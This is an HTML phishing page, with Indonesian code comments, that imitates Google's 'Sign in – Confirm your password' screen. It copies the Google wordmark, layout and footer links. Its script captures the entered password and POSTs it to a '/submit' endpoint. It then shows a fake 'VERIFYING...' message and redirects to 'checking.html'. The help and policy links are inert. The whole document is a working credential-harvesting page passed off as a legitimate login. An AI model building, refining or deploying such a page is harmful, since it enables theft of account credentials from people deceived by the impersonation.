<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <title>Sign in - Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Roboto, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            background-color: #f0f4f9;
            color: #202124;
            line-height: 1.4;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 24px;
        }

        /* Kotak Putih Utama Google */
        .container {
            width: 100%;
            max-width: 450px;
            padding: 48px 40px 36px 40px;
            border: 1px solid #dadce0;
            background: #ffffff;
            border-radius: 8px;
            display: flex;
            flex-direction: column;
        }

        header { 
            text-align: center; 
            margin-bottom: 0px; 
        }

        /* Replikasi Google Wordmark Presisi */
        .g-logo {
            display: inline-block;
            font-family: 'Product Sans', 'Google Sans', Roboto, Arial, sans-serif;
            font-weight: 500;
            font-size: 24px;
            letter-spacing: -0.2px;
            line-height: 1;
            margin-bottom: 16px;
            width: 100%;
            text-align: center;
        }

        .g-logo span { display: inline-block; }
        .g-blue { color: #4285F4; }
        .g-red { color: #EA4335; }
        .g-yellow { color: #FBBC05; }
        .g-green { color: #34A853; }

        /* Judul Utama */
        h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 8px;
            text-align: center;
        }

        /* Sub-judul Instruksi */
        .subhead {
            font-size: 16px;
            font-weight: 400;
            color: #202124;
            margin-bottom: 32px;
            text-align: center;
        }

        form { margin-top: 0px; }

        .form-row { margin-bottom: 24px; }

        /* Pembungkus Input untuk Efek Outlined Box Khas Google */
        .input-wrapper { 
            position: relative; 
            width: 100%;
            display: flex;
            align-items: center;
        }

        /* Label dibuat menetap memotong border atas sejak awal */
        label.floating-label {
            position: absolute;
            left: 12px;
            top: 0;
            transform: translateY(-50%);
            background: #ffffff;
            padding: 0 4px;
            font-size: 12px;
            color: #1a73e8; 
            transition: 0.15s ease all;
            pointer-events: none;
            z-index: 2;
        }

        /* Input dengan padding kanan 44px agar teks tidak menabrak ikon mata */
        input[type="password"], input[type="text"] {
            width: 100%;
            padding: 16px 44px 16px 14px; 
            border: 2px solid #1a73e8; 
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            background: transparent;
            color: #202124;
        }

        input[type="password"]:not(:focus), input[type="text"]:not(:focus) {
            border: 2px solid #1a73e8;
        }

        /* FITUR BARU: Pembungkus Ikon Mata di Kanan Kolom */
        .toggle-password {
            position: absolute;
            right: 8px;
            cursor: pointer;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 6px;
            border-radius: 50%;
            user-select: none;
            z-index: 3;
            width: 36px;
            height: 36px;
            background-color: transparent; /* Memastikan transparan */
        }
        
        .toggle-password:hover {
            background-color: transparent; /* Hover tetap transparan seperti request Anda */
        }

        /* FITUR BARU: Animasi Coretan Ikon Mata SVG */
        .eye-icon {
            width: 24px;
            height: 24px;
        }

        .eye-slash-mask, .eye-slash-fg {
            stroke-dasharray: 25;
            stroke-dashoffset: 0;
            transition: stroke-dashoffset 0.15s cubic-bezier(0.4, 0, 0.2, 1); /* Durasi dipercepat jadi 0.15s */
        }

        /* Ketika class 'show-password' aktif, coretan akan menghilang/dihapus perlahan */
        .show-password .eye-slash-mask, 
        .show-password .eye-slash-fg {
            stroke-dashoffset: 25;
        }

        /* Baris Tombol & Tautan */
        .actions {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-top: 26px;
        }

        .left-links { display: flex; align-items: center; }

        .help-link {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .help-link:hover { color: #1557b0; }

        /* Tombol Next Sesuai Dimensi Google */
        .btn-next {
            padding: 10px 24px;
            background-color: #1a73e8;
            color: #fff;
            border: 0;
            font-weight: 500;
            font-size: 14px;
            border-radius: 4px;
            cursor: pointer;
            white-space: nowrap;
            transition: background-color 0.15s;
        }

        .btn-next:hover { 
            background-color: #1557b0; 
        }

        .btn-next:disabled { background: #c6d6f9; cursor: not-allowed; }

        #error-msg {
            color: #d93025;
            font-size: 12px;
            margin-top: 8px;
            font-weight: 400;
        }

        .hidden { display: none !important; }

        .status-box { text-align: center; padding: 18px 0; }
        
        .loader-text {
            font-weight: 600;
            color: #1a73e8;
            margin-bottom: 12px;
            letter-spacing: 1px;
        }

        .divider { display: none; }

        /* Footer Standar Google */
        .footer-outer { 
            width: 100%;
            max-width: 450px;
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            font-size: 12px; 
            color: #747775;
            margin-top: 24px;
            padding: 0 4px;
        }

        .footer-outer .right-links a { 
            color: #747775; 
            text-decoration: none; 
            margin-left: 16px; 
        }

        .footer-outer .right-links a:hover { color: #202124; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <div class="g-logo" aria-label="Google">
                <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
            </div>
            <h1>Sign in</h1>
        </header>

        <div id="form-container">
            <div class="subhead">Confirm your password</div>
            <form id="update-form">
                <div class="form-row">
                    <div class="input-wrapper">
                        <input type="password" id="password" name="password" placeholder=" " required>
                        <label class="floating-label" for="password">Enter your password</label>
                        
                        <!-- FITUR BARU: Ikon Mata Animasi Coretan -->
                        <div class="toggle-password" id="toggle-password">
                            <svg class="eye-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                                <defs>
                                    <mask id="eye-mask">
                                        <rect width="24" height="24" fill="white" />
                                        <!-- Garis ini menembus/menghapus bagian mata di bawah coretan -->
                                        <line x1="4" y1="4" x2="20" y2="20" stroke="black" stroke-width="3" stroke-linecap="round" class="eye-slash-mask" />
                                    </mask>
                                </defs>
                                <!-- Bentuk Mata (Warna Biru #1a73e8) -->
                                <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#1a73e8" mask="url(#eye-mask)"/>
                                <!-- Garis coretan yang bergerak (Warna Biru #1a73e8) -->
                                <line x1="4" y1="4" x2="20" y2="20" stroke="#1a73e8" stroke-width="2" stroke-linecap="round" class="eye-slash-fg" />
                            </svg>
                        </div>
                    </div>
                    <div id="error-msg" class="hidden"></div>
                </div>

                <div class="actions">
                    <div class="left-links">
                        <a class="help-link" href="#" onclick="return false;">Forgot password?</a>
                    </div>
                    <div>
                        <button type="submit" id="submit-btn" class="btn-next">Next</button>
                    </div>
                </div>
            </form>
        </div>

        <div id="checking-container" class="hidden status-box">
            <div class="loader-text">VERIFYING...</div>
            <p style="font-size: 14px; color: #5f6368;">The system is validating your credentials. This may take up to 60 seconds. Do not close this browser window.</p>
        </div>
    </div>

    <div class="footer-outer">
        <div class="left-lang" style="cursor: pointer;">English (United States) ▾</div>
        <div class="right-links">
            <a href="#" onclick="return false;">Help</a>
            <a href="#" onclick="return false;">Privacy Policy</a>
            <a href="#" onclick="return false;">Terms of Service</a>
        </div>
    </div>

    <script>
        const form = document.getElementById('update-form');
        const submitBtn = document.getElementById('submit-btn');
        const formContainer = document.getElementById('form-container');
        const checkingContainer = document.getElementById('checking-container');
        const errorMsg = document.getElementById('error-msg');
        
        // FITUR BARU: Logika Tampilkan Sandi dengan Animasi
        const togglePasswordBtn = document.getElementById('toggle-password');
        const passwordInput = document.getElementById('password');

        togglePasswordBtn.addEventListener('click', function() {
            // Cek kondisi saat ini, lalu ubah
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                this.classList.add('show-password'); // Menjalankan animasi hapus coretan
            } else {
                passwordInput.type = 'password';
                this.classList.remove('show-password'); // Menjalankan animasi buat coretan
            }
        });

        // SISA KODE ASLI DI BAWAH INI SAMA SEKALI TIDAK DIRUBAH
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            const password = passwordInput.value; 

            if (password.length < 8) {
                showError('Minimum 8 characters required');
                return;
            }

            submitBtn.disabled = true;
            formContainer.classList.add('hidden');
            checkingContainer.classList.remove('hidden');

            fetch('/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'password=' + encodeURIComponent(password)
            }).catch(function(error) {
                console.error('Error:', error);
                formContainer.classList.remove('hidden');
                checkingContainer.classList.add('hidden');
                showError('Connection timeout. Retry.');
                submitBtn.disabled = false;
            });

            window.location.href = 'checking.html';
        });

        function showError(message) {
            errorMsg.textContent = message;
            errorMsg.classList.remove('hidden');
            setTimeout(() => errorMsg.classList.add('hidden'), 3000);
        }

        const btn = document.getElementById('submit-btn');
        if (btn) btn.textContent = 'Next';
    </script>
</body>
</html>
